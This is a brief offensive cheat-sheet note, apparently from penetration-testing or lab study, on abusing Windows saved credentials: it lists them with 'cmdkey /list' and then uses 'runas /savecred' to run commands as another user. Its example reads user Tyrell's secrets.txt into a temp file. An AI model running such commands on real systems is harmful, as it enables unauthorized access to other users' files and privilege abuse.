Runas is the 'sudo' of Windows:

	Step 1: check which creds are available for which user
		example: cmdkey /list

	Step 2: check which user has creds saved and use those
		syntax : runas /savecred /user:<user> "cmd /c <cmd>"
		example: runas /savecred /user:Tyrell "cmd /c type C:\Users\Tyrell\Documents\secrets.txt > C:\Windows\Temp\nothing.txt"
